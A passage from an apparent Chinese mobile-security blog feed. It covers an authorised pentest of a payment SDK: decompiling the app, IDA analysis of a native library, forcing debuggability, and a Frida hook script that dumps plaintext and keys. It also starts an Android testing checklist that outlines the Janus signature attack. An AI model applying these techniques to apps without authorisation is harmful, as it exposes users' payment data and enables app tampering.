class="line">Java.perform(RevealNativeMethods);</span><br></pre></td></tr></table></figure></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06. 参考"></a>0x06. 参考</h2><p><a href="https://github.com/longlinht/android_source" target="_blank" rel="noopener">https://github.com/longlinht/android_source</a><br><a href="https://www.cnblogs.com/wainiwann/p/3835904.html" target="_blank" rel="noopener">https://www.cnblogs.com/wainiwann/p/3835904.html</a><br><a href="http://xdprof.sourceforge.net/doxygen/structJNIEnv__-members.html" target="_blank" rel="noopener">http://xdprof.sourceforge.net/doxygen/structJNIEnv__-members.html</a><br><a href="https://www.cnblogs.com/aliflycoris/p/5507236.html" target="_blank" rel="noopener">https://www.cnblogs.com/aliflycoris/p/5507236.html</a><br><a href="https://www3.ntu.edu.sg/home/ehchua/programming/java/JavaNativeInterface.html#zz-2.4" target="_blank" rel="noopener">https://www3.ntu.edu.sg/home/ehchua/programming/java/JavaNativeInterface.html#zz-2.4</a><br><a href="https://stackoverflow.com/questions/51811348/find-manually-registered-obfuscated-native-function-address" target="_blank" rel="noopener">https://stackoverflow.com/questions/51811348/find-manually-registered-obfuscated-native-function-address</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;前言：&lt;br&gt;之前在测试一个APP时，需要自己去写一个APP调用so库来进行通信的加解密。由于so文件使用了动态注册，所以没能找到对应的Native加解密方法来进行分析。所以这一篇就自己探索一下JNI接口了调用so库的方法，以及如何发现和定位动态注
      
    
    </summary>
    
      <category term="移动安全" scheme="http://fanxs-t.github.io/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Android" scheme="http://fanxs-t.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>记一次APP加密通信后的分析过程</title>
    <link href="http://fanxs-t.github.io/2019/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1APP%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%E5%90%8E%E7%9A%84%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/"/>
    <id>http://fanxs-t.github.io/2019/07/28/记一次APP加密通信后的分析过程/</id>
    <published>2019-07-28T04:32:12.000Z</published>
    <updated>2019-08-11T10:23:10.814Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：<br>最近有一次驻场测试，需要对甲方开发的支付SDK进行测试。到了甲方公司，对方负责人只给了我们一个SDK demo APP和接口文档，其他啥都没有给。让人崩溃的是，Demo里出来的通信过程是加密的，所有接口也是进行加密通信，而负责人并没有给我们报文的加密过程。这篇文章就记录了这一次测试的坎坷分析经历，以供自己以后再做参考。</p></blockquote><h2 id="0x00-Demo报文"><a href="#0x00-Demo报文" class="headerlink" title="0x00.Demo报文"></a>0x00.Demo报文</h2><p>甲方爸爸给我们的接口文档，包含了十几个不同的接口。接口共用几个URL，由请求包中的TransId来注明不同的接口服务。<br>而文档里只给了参数的定义，没有发包的加密过程：<br><img src="http://148.70.228.11/upload/7bea45d9cc654fb2de39defb2576bcf8.png" alt=""><br>Demo APP打开后，有一个输入框和“支付”按钮：<br><img src="http://148.70.228.11/upload/4d2dfba425a82c675232947db4520dd6.png" alt=""><br>输入框里的内容为接口明文报文的base64:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;MerchantId&quot;:&quot;1000000000000000001&quot;,&quot;TransAmt&quot;:&quot;39.09&quot;,&quot;MerchantSeqNo&quot;:&quot;1551944989458&quot;,&quot;MerchantDate&quot;:&quot;20190307&quot;,&quot;MerchantTime&quot;:&quot;203718&quot;,&quot;Currency&quot;:&quot;CNY&quot;,&quot;FrontUrl&quot;:&quot;http://www.baidu.com&quot;,&quot;BackUrl&quot;:&quot;http://10.1.193.48:7001/gwback/weixin&quot;,&quot;PortFlag&quot;:&quot;0&quot;,&quot;OrderInfo&quot;:&quot;[&#123;\&quot;OrderTime\&quot;:\&quot;201115\&quot;,\&quot;OrderAmt\&quot;:\&quot;39.09\&quot;,\&quot;OrderBody\&quot;:\&quot;&quot;,\&quot;OrderId\&quot;:\&quot;15519449894580001\&quot;,\&quot;OrderSubject\&quot;:\&quot;&quot;,\&quot;OrderDate\&quot;:\&quot;20190307\&quot;&#125;]&quot;,&quot;Body&quot;:&quot;&quot;,&quot;Subject&quot;:&quot;Payment&quot;,&quot;sign&quot;:&quot;YPRhN2pn+sZKEwbepdzoy+M15YG60lEFmClVlYrVFT1TZ/c+qH0vUVHmfbI9JGGFeTVvUtBeD5IIYyJgvna4T5ekwM/8uv2N7cuUp/h9SmzDLOjqCu05kz5T5bsKGZT7s2DXgeiScqEn5YlpVAL7oXjH3/Sf+r7vuQlwAx5NSPc=&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>发出的请求是这样的：<br><img src="http://148.70.228.11/upload/7882719e77d428ec9112e65be53925de.png" alt=""><br>尝试base64解密后，都是不知其意的字节码，可知整个报文是经过加密的。和甲方负责人确认后，可知支付按钮发出的请求是下单的接口，此接口定义为：<br><img src="http://148.70.228.11/upload/765b7ce35703af391bbd559d96b3fc1a.png" alt=""><br>接口定义和base64解码后的原文根本不对应啊，而且用这个Demo只能测试下单一个接口，其他十几个接口只能通过burp造请求包来测试。这时测试的首要问题，就是要知道该如何加密请求包。</p><p>要搞清楚这一点，我就要知道：</p><ol><li>加密前的原报文是什么样（内容、格式）</li><li>加密的方法是什么</li><li>实现加密</li></ol><h2 id="0x01-逆向Demo"><a href="#0x01-逆向Demo" class="headerlink" title="0x01. 逆向Demo"></a>0x01. 逆向Demo</h2><p>为了知道加密方法，先逆向demo app。打开dex后，发现demo被混淆了：<br><img src="http://148.70.228.11/upload/ab32a1104409897c6612f52838b3d7a9.png" alt=""><br>心情是崩溃的，连给我们驻场测试的demo都是混淆的，图啥呢。。搜索请求包里的参数“data”，找到了这一个类：<br><img src="http://148.70.228.11/upload/60c4be78aa792495b7b83fea263d62ad.png" alt=""><br><img src="http://148.70.228.11/upload/398c12f5fae8534242249673bf189df4.png" alt=""><br>非常明显，这个类负责构造请求包参数并发出请求，此处调用了telecomAesDecrypt做加密。这个方法在类PEJniLib中：<br><img src="http://148.70.228.11/upload/f78c24b96e1b44346b9d66a7121a6d87.png" alt=""><br>这个类中用System.loadLibrary加载了一个so文件，并声明了相关的方法。telecomAesDecrypt函数调用了so文件中的native method进行具体的加密。</p><h2 id="0x02-逆向So"><a href="#0x02-逆向So" class="headerlink" title="0x02.逆向So"></a>0x02.逆向So</h2><p>可见telecomAesDecrypt具体调用的native方法是getNativeValue(s, s2)。在java代码中调用具体的native方法时，需要在so文件中以固定命名规则定义相应的函数。根据官方文档，命名规则为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Dynamic linkers resolve entries based on their names. A native method name is concatenated from the following components:</span><br><span class="line"></span><br><span class="line">*   the prefix `Java_`</span><br><span class="line">*   a mangled fully-qualified class name</span><br><span class="line">*   an underscore (`_`) separator</span><br><span class="line">*   a mangled method name</span><br><span class="line">*   for overloaded native methods, two underscores (`__`) followed by the mangled argument signature</span><br></pre></td></tr></table></figure></p><p>所以这里的getNativeValue在so文件中应该会命名为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java_package_PEJniLib_getNativeValue(JNIEnv *env, jobject obj, jstring s ,jstring s2)</span><br></pre></td></tr></table></figure></p><p>打开ida，对so文件进行逆向。在Export窗口搜索“java”：<br><img src="http://148.70.228.11/upload/5d7c274745f142c7f9bce85f41b078dd.png" alt=""><br>竟然没有以Java开头的函数。这时又懵逼了，不以固定的命名规则来定义函数，Java VM怎么能调用到正确的函数？后来查了很多的资料才发现，当时太年轻了，JNI接口的Native方法不仅仅能以固定的命名规则来进行定位（静态注册），还能通过加载so文件时的JNI_Onload函数进行 <em>动态注册</em> ，当然这是后话了。</p><p>在Export里搜JNI：<br><img src="http://148.70.228.11/upload/a11354caabc9a50867c9247f76692704.png" alt=""><br>发现一个名称和目标 <em>getNativeValue(JNIEnv *env, jobject obj, jstring s ,jstring s2)</em> 匹配度非常高的函数getValues(_JNIEnv <em>,_jobject </em>,_jstring <em>,_jstring </em>)。它调用了其他的函数来进行加密，最后追述到进行具体加密的函数getValue(char <em>a1, char </em>a2):<br><img src="http://148.70.228.11/upload/90bf578bb974d4cd00f423abb0f3ff9d.png" alt=""><img src="http://148.70.228.11/upload/7cdbdaa70321e99e7b24f86527193121.png" alt=""><img src="http://148.70.228.11/upload/ec0ae99eac538873cf0f1cc7eca577d2.png" alt=""><br>因为这个so文件保留了符号表，可以很清晰地看出这里的函数做了什么。分析这个函数，可发现报文加密后会用“|”分成3个部分。第一部分是RSA加密的AES密钥，第二部分是AES加密报文串，第三部分是报文串MD5摘要值，每次加密都会随机生成AES密钥。</p><p>再对比Demo发出的请求：<br><img src="http://148.70.228.11/upload/8c6759ba8eff6e8a4a92a344535f8f56.png" alt=""><br>因为base64字符表中并不包含“|”，所以加密后的报文的确由“|”分为了三部分。在so文件中看了其他函数后，并没有发现更合适的函数了，因此可断定了报文的加密方式。</p><h2 id="0x03-动态调试so"><a href="#0x03-动态调试so" class="headerlink" title="0x03. 动态调试so"></a>0x03. 动态调试so</h2><p>知道了加密方式，解决了第2个问题。但还需要知道加密前的明文报文是什么样子的。因为APP的dex代码被混淆了，不高兴从dex里解决这个问题，所以我想到动态调试so文件。</p><p>参考<a href="https://blog.csdn.net/lwanttowin/article/details/62042095" target="_blank" rel="noopener">使用IDA Pro动态调试SO文件</a>一文用真机进行动态调试：</p><ol><li>将手机插上电脑，启动android_server</li><li>adb forward tcp:23946 tcp:23946</li><li>am start -D -n com.example.test/com.example.test.MainActivity命令，启动所要调试的Activity</li><li>启动ida pro，点击”Debugger - &gt; Attach -&gt; Remote ArmLinux/Android debugger“，port 23946，在弹出的”Choose process to attach to”窗口中找到应用进程</li><li>打开DDMS，找到要调试应用的端口，通常为8700或8600</li><li>jdb -connect com.sun.jdi.SocketAttach:port=8700,hostname=localhost</li><li>IDA点击执行，函数打断点，开始动态调试。</li></ol><p>在调试过程中，遇到一些问题：</p><ol><li>IDA里的调试器不能选错，必须是Remote ArmLinux/Android debugger</li><li>在第5步中，打开DDMS看不到任何应用的端口。</li></ol><p>要进行第6步，就必须要知道应用端口，这个只能通过DDMS来获取。但DDMS打开来看不到任何应用的端口，这个问题愁了我好久，后来才发现答案：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DDMS中看不到进程，是因为它只能显示可调试debuggable=true的进程信息。要调试一个apk里面的dex代码，必须满足以下两个条件中的任何一个:</span><br><span class="line">· APP的AndroidManifest.xml文件必须设置属性android:debuggable=&quot;true&quot;，设置为可调试。</span><br><span class="line">· 系统/default.prop中ro.debuggable的值为1</span><br></pre></td></tr></table></figure></p><p>而这个demo APP并没有设置为可调试。解决方法有：</p><ol><li>用apktools进行APP重打包，修改Manifest文件，加上可调试属性。</li><li>Hook  system  debug<br>(用xposed的插件Xinstaller/BuildProp，都可以做到， Xposed插件Xinstaller，打开“专家模式”和“调试应用，或BuildProp设置ro.debuggable=1）</li><li>修改底层系统的boot.img，设置/default.prop中ro.debuggable=1，再刷机</li><li>用mprop进行hook,设置应用为可调试</li></ol><p>由于我的安卓测试机已经root了，所以我使用了最简单的第二个方法，在Xposed框架支持下安装了BuildProp，设置为ro.debuggable=1即可。附上链接：<a href="https://repo.xposed.info/module/com.jecelyin.buildprop" target="_blank" rel="noopener">BuildProp</a></p><p>整好BuildProp，拿到端口后，终于可以进行动态调试。但在IDA中点击运行后，并没有停在设置好的断点上，出现了不明的原因，所以动态调试就算失败了。</p><h2 id="0x04-TraceView和Frida"><a href="#0x04-TraceView和Frida" class="headerlink" title="0x04. TraceView和Frida"></a>0x04. TraceView和Frida</h2><p>动态调试so文件失败了，还是没有解决构造加密前报文的问题。所以想到了另一条路，用Frida进行java层的hook。</p><p>之前我涛哥和震哥在破解一个加壳APP的通信加密算法时，用Frida来进行了加密类初始化函数的hook，找到了密钥，用TraceView来猜测到加密类初始化的函数。本着学习的目的，虽然前面已通过逆向APP来找到hook的函数，但我也用TraceView来进行了尝试。</p><p>TraceView配合Frida,具体可参考：</p><ul><li><a href="https://la0s.github.io/2018/06/21/frida/" target="_blank" rel="noopener">使用Frida框架进行hook</a></li><li><a href="https://la0s.github.io/2018/07/07/frida2/" target="_blank" rel="noopener">Frida后记——看我是怎么不用脱壳&amp;逆向来解密APP的数据</a></li></ul><h3 id="TraceView"><a href="#TraceView" class="headerlink" title="TraceView"></a>TraceView</h3><p><em><strong>Traceview</strong></em> 工具是Android SDK中自带的工具，用于分析APP的计算性能，可以对安卓进程进行trace分析，通过图形化的方式展示要跟踪的程序的性能，并且能具体到方法。_</p><ol><li><p>打开DDMS，在窗口中选中要监控的进程后，点击<strong>Start Method Profiling</strong>，开始对进程函数调用的监控：<br><img src="http://148.70.228.11/upload/5e0a3619dd6279044b07e4a858d58bdb.png" alt=""></p></li><li><p>在APP中进行操作。在Demo APP中点击按钮，发送请求。此时会经过一系列的函数调用，包含了报文初始化、报文加密、请求发送等过程。这些函数调用都已被Traceview所记录。</p></li><li><p>点击<strong>Stop Method Profiling</strong>，停止记录。这时TraceView显示了监控期间的函数调用情况：<br><img src="http://148.70.228.11/upload/9383fd3250f625ebfecc18eb6310c5b0.png" alt=""></p></li><li><p>分析监控期间的函数调用。在方法调用最密集的时候，应该就是一连串的方法调用来发出了请求。这时需要根据调用函数的 <em>参数类型，参数个数，返回值类型</em> 来进行猜测哪一个函数可能参与了加密过程。<img src="http://148.70.228.11/upload/495285bf7bc354b83e09ed6e88ebe08d.png" alt=""></p></li></ol><p>当通信加密的APP被加壳或严重混淆时，TraceView可协助猜测加密类和加密函数，以便下一步Frida进行Hook。</p><p><em>此前我涛哥和震哥，在面对通信加密的加壳APP时，搜到了测试APP未加壳时的老版本，找到了里面的加密函数和加密类，再结合TraceView成功猜测到了新版本APP里的加密方法的类名和函数名，最后用Frida Hook出了被修改的密钥。这是个非常有趣的思路。</em></p><h3 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h3><p><em><strong>Frida</strong></em> 是一款基于Python和Javascript 的hook框架，可运行在Android，iOS，Linux，Win等各平台。Frida不仅可以用于hook java层，也可以进行native层的hook。利用Frida进行hook时，要求需要使用已ROOT的手机。</p><p>根据逆向Demo APP和Traceview的结果，可知类PEJniLib的telecomAesEncrypt函数返回了明文报文的加密结果。所以用Frida Hook这个函数，就可以找到明文报文是啥格式。<br><img src="http://148.70.228.11/upload/0db99541ae53f7a9ce38b2bf02d6017a.png" alt=""><br><strong>telecomAesEncrypt:</strong></p><ul><li>2个参数</li><li>参数类型都为 字符串</li><li>返回值类型 字符串</li></ul><p>根据以上已知内容，写Frida Hook代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Javascript代码中，在Java层对PEJniLib类的telecomAesEncrypt(String, String)方法进行了hook</span></span><br><span class="line"><span class="comment"># 打印出了此函数调用时的参数值</span></span><br><span class="line">jscode = <span class="string">"""</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var Md5Util = Java.use("com.package.PEJniLib");</span></span><br><span class="line"><span class="string">    Md5Util.telecomAesEncrypt.overload('java.lang.String','java.lang.String').implementation=function(p1,p2)&#123;</span></span><br><span class="line"><span class="string">        console.log(p1);</span></span><br><span class="line"><span class="string">        console.log(p2);      </span></span><br><span class="line"><span class="string">        return this.telecomAesEncrypt(p1,p2);</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取frida-server目标设备，和目标APP的进程pid</span></span><br><span class="line">device = frida.get_device_manager().enumerate_devices()[<span class="number">-1</span>]</span><br><span class="line">pid = device.spawn([<span class="string">"com.package"</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 附加到目标APP上，创建一个Session</span></span><br><span class="line"><span class="comment"># Session可以理解为一次会话，比如附加到某个进程则算是启动了一次会话，也可以理解为进程的抽象</span></span><br><span class="line">session = device.attach(pid)</span><br><span class="line">print(<span class="string">"[*] Attach Application id:"</span>,pid)</span><br><span class="line"><span class="comment"># 让应用恢复运行</span></span><br><span class="line">device.resume(pid)</span><br><span class="line">print(<span class="string">"[*] Application onResume"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据参数字符串创建一个Scritp对象，参数里的js脚本会被加载到目标进程中</span></span><br><span class="line">script = session.create_script(jscode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在监听到一个message时，执行on_message函数</span></span><br><span class="line"><span class="comment"># 此处的message为一个Javascript对象，为Javascript和Python之间沟通的基本消息类，有type和payload属性</span></span><br><span class="line"><span class="comment"># 比如，Javascript代码报错时，会传出type为error的message,其中的payload就为报错信息</span></span><br><span class="line"><span class="comment"># 打印出message: &#123;'type':  'error',  'description':  'ReferenceError: a is not defined',  u'lineNumber':  1&#125;</span></span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载代码</span></span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure></p><p>启动frida:</p><ol><li>adb shell 后启动frida-server<br><img src="http://148.70.228.11/upload/667ced6aa4df8b23c908edc2538c2912.png" alt=""></li><li><p>端口转发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br></pre></td></tr></table></figure></li><li><p>如果PC端frida-pc打出了进程，则说明连接正常：<br><img src="http://148.70.228.11/upload/aee85d6537710a1dcd9f5edd2f380029.png" alt=""></p></li></ol><p>将代码执行，成功地输出了明文报文和密钥：<br><img src="http://148.70.228.11/upload/75237bb6042d5904b3d1c50720c09ea0.png" alt=""></p><h2 id="0x05-实现加密"><a href="#0x05-实现加密" class="headerlink" title="0x05. 实现加密"></a>0x05. 实现加密</h2><p>已知<strong>明文报文</strong>和<strong>加密方式</strong>，接下来就只剩下实现加密算法，来进行之后的测试。一开始的想法是，既然我都有了具体的加密算法，那就直接写代码实现就好了。由于只能在甲方的内网机器上进行测试，机器上没有python环境和依赖库，所以只能编写java代码。</p><p>在写了2天的Java代码后，遇到了2个大坑：</p><ol><li>由于不熟悉Java开发，所以写代码的效率很低</li><li>Java库不同导致加密错误。内网机器上没有常用的库，如apache。我用一些基本库写完了加密实现后，发现加密结果永远都不对。后来和甲方的开发求助，对接了一下代码，才发现同样的明文，我们用了不一样的库，base64的结果就已经不一样了。</li></ol><p>以上的坑导致我心态崩了，本来就不会java，驻场时间紧，得硬着头上还撞到了墙。这时我就不想搞了，换了个思路。<em>既然我都知道明文报文的格式了，那何不直接写一个APP调用so文件来进行加密</em>。</p><p>编写APP调用已有的so文件，需要：</p><ol><li>打开Android Studio新建一个Project，并第一步勾选Include C++ support:</li><li>在项目文件夹下，建立libs文件，并将so文件的不同系统的实现都放进去libs中。<br><img src="http://148.70.228.11/upload/679fd40f23ad66365a22d956e0964f08.png" alt=""></li><li>在项目的gradle中添加这一项：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sourceSets&#123;</span><br><span class="line">   main&#123;</span><br><span class="line">       jniLibs.srcDirs = [&apos;libs&apos;]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><img src="http://148.70.228.11/upload/d24623f14bfe5c7a5a9d11809b5d2053.png" alt=""></p><p>然后就可以开始编写APP的功能了。APP的layout简单地放了输入框和加解密按钮：<br><img src="http://148.70.228.11/upload/d648bb2c7fcbc2360a46f2f98a39f3f2.png" alt=""></p><p>定义一个PEJniLib类，声明了Native方法，此处需要package名和class名严格和so文件中对应。由于动态注册，在编译时会提醒Native方法无法解析，但依然能成功build app：<br><img src="http://148.70.228.11/upload/337aad1b038a37f41dd7de6e7f1086d3.png" alt=""><br>这里需要注意的是，类名必须是”PEJniLib“，否则会提醒找不到类。估摸着应该是动态注册时绑定了这一个类名。</p><p>MainActivity中则简单地将输入框的内容，传到PEJniLib的响应Native类中，进行加解密：<br><img src="http://148.70.228.11/upload/271243998bbb952c7ae9c5cef80feffe.png" alt=""></p><p>至此，相关接口测试时的通信加解密问题，就解决了。这一篇文章，也旨在做一次记录，以供以后遇到相关问题时再做参考。</p><p>以下是在完成了这次驻场测试后，对动态注册Native方法的思考和研究。</p><h2 id="0x06-JNI调用探索"><a href="#0x06-JNI调用探索" class="headerlink" title="0x06.JNI调用探索"></a>0x06.JNI调用探索</h2><p>在完成了测试后，我在考虑2个问题：</p><ol><li>Native方法的动态注册，究竟是怎么样的一个过程</li><li>在上文中，so文件保留了符号表，所以IDA逆向后能看到原始的函数名，因此我才猜测到了目标getValues方法。若如果so文件加壳了，仅仅知道Java VM调用的Native方法是getNativeValue，怎么在so文件中找到相应的函数呢？或有没有更方便的方法定位so库里的方法。</li></ol><p>简单地说，动态注册是怎么实现的？若Native方法是动态注册的，要怎么来定位呢？基于自己不懂Android开发，就自己探索了一下JNI，记录在了下一篇文章里。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;前言：&lt;br&gt;最近有一次驻场测试，需要对甲方开发的支付SDK进行测试。到了甲方公司，对方负责人只给了我们一个SDK demo APP和接口文档，其他啥都没有给。让人崩溃的是，Demo里出来的通信过程是加密的，所有接口也是进行加密通信，而负责人并没有
      
    
    </summary>
    
      <category term="移动安全" scheme="http://fanxs-t.github.io/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Android" scheme="http://fanxs-t.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>【整理笔记】Android APP基础安全测试</title>
    <link href="http://fanxs-t.github.io/2018/10/29/%E3%80%90%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0%E3%80%91Android%20APP%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    <id>http://fanxs-t.github.io/2018/10/29/【整理笔记】Android APP基础安全测试/</id>
    <published>2018-10-29T08:18:10.000Z</published>
    <updated>2019-07-23T06:24:03.491Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：<br>在公司时，会接到很多APP的测试项目，其中就包括移动端安全的基本测试。由于本人对移动端安全没有很多的研究，在单独做这些项目时会遇到很多的困难，所以专门总结了这篇文章，<strong>以供自己测试需要</strong>。大佬请提出建议或有效避让。</p></blockquote><h1 id="客户端安全"><a href="#客户端安全" class="headerlink" title="客户端安全"></a>客户端安全</h1><h2 id="签名安全"><a href="#签名安全" class="headerlink" title="签名安全"></a>签名安全</h2><h3 id="检测目的"><a href="#检测目的" class="headerlink" title="检测目的"></a>检测目的</h3><p>检测客户端安装包是否正确签名。通过签名，可以检测出安装包在签名后是否被修改过。</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>1.查看META-INF目录下的文件，若存在.SF和.RSA文件，则说明APP已经过了签名。<br>2.利用GetApkInfo.jar，查看是否使用v2.0签名机制。</p><h3 id="检测详情"><a href="#检测详情" class="headerlink" title="检测详情"></a>检测详情</h3><p>使用GetAPKInfo:<br><img src="http://148.70.228.11/upload/bab34afe0fae832d4ef6dc54888e008e.png" alt=""></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>使用v1.0 + v2.0对APP进行签名。</p><h3 id="相关背景"><a href="#相关背景" class="headerlink" title="相关背景"></a>相关背景</h3><p>开发者发布了一个应用，该应用一定需要开发者使用他的私钥对其进行签名。恶意攻击者如果尝试修改了这个应用中的任何一个文件（包括代码和资源等），那么他就必须对APK进行重新签名，否则修改过的应用是无法安装到任何Android设备上的。但如果恶意攻击者用另一把私钥对APK签了名，并将这个修改过的APK对用户手机里的已有应用升级时，就会出现签名不一致的情况。因此，在正常情况下，Android的签名机制起到了防篡改的作用。 </p><p><strong>v1.0签名的过程为：</strong></p><ol><li>遍历apk中的所有子目录和文件，计算每个文件的SHA1摘要，然后用base64进行编码。将编码后的字符串和文件的路径存入MANIFEST.MF文件，如下图：<br><img src="http://148.70.228.11/upload/e6788ef9b3e4058e8aea4cfe45bf7cb3.png" alt=""></li><li>计算MANIFEST.MF文件的SHA1摘要，base64编码之后存入CERT.SF文件的SHA1-Digest-Manifest字段中。遍历MANIFEST.MF文件的所有项，计算每项的SHA1摘要，base64编码之后存入CERT.SF文件，如下图：<br><img src="http://148.70.228.11/upload/0cd2fc118ef72ec6d755c9f2df5d306f.png" alt=""><br>3.用私钥计算出CERT.SF的数字签名，将此签名值以及公钥信息写入CERT.RSA</li></ol><p><strong>验签过程：</strong><br>Android手机在安装App的时候，会对App的签名进行验证。只有签名验证通过，才能安装在手机上。验签过程和签名过程对应，分如下几步：<br>1.计算App里每个文件的SHA1摘要并进行base64编码，将结果与MANIFEST.MF文件中的对应项进行比对，确认是否相同。</p><p>2.遍历MANIFEST.MF文件，计算每项的SHA1摘要并进行base64编码，将结果与CERT.SF文件中的对应项进行比对，确认是否相同。</p><p>3.验证CERT.SF文件的签名信息和CERT.RSA中的内容是否相同。</p><p><strong>Janus漏洞和v2.0签名</strong><br>Janus（CVE-2017-13156），该漏洞允许攻击者任意修改Android应用中的代码，而不会影响其签名。<br>Janus漏洞具体：</p><blockquote><p><a href="http://www.droidsec.cn/janus%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://www.droidsec.cn/janus%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/</a></p></blockquote><p>Janus攻击步骤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 从设备上取出目标应用的APK文件，并构造用于攻击的DEX文件；</span><br><span class="line">2.将攻击DEX文件与原APK文件简单拼接为一个新的文件；</span><br><span class="line">3.修复这个合并后的新文件的ZIP格式部分和DEX格式部分；</span><br></pre></td></tr></table></figure></p><p>修复方案为使用v2.0签名机制。</p><p>v1.0和v2.0两个版本的签名区别在于，前者是对APK中的每个文件进行签名，如果APK中某个文件被篡改了，那么签名验证将会通不过；后者则是对整个APK文件进行签名，只要APK文件的内容发生变化则签名失效。<br><img src="http://148.70.228.11/upload/207c572644c8192d0c40cab1b663f66c.png" alt=""><br>使用 APK 签名方案 v2 进行签名时，会在 APK 文件中插入一个 APK 签名分块，该分块位于“ZIP 中央目录”部分之前并紧邻该部分。在“APK 签名分块”内，v2 签名和签名者身份信息会存储在 APK 签名方案 v2 分块中。<br><img src="http://148.70.228.11/upload/365849b55a3c4109abc4292083a44804.png" alt=""><br><strong>图 1.</strong> 签名前和签名后的 APK</p><p>APK 签名方案 v2 是在 Android 7.0 (Nougat) 中引入的。为了使 APK 可在 Android 6.0<br>(Marshmallow) 及更低版本的设备上安装，应先使用 JAR 签名功能对 APK 进行签名，然后再使用 v2 方案对其进行签名。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><strong>Android应用签名使用方法：</strong><br>1.选择Generate Signed APK<br><img src="http://148.70.228.11/upload/8bc9649cb47be36db3f4de209c3860fc.png" alt=""></p><ol start="2"><li>选择证书或创建证书：<br><img src="http://148.70.228.11/upload/bd68f4d62d655162c9fd6987c44d1e86.png" 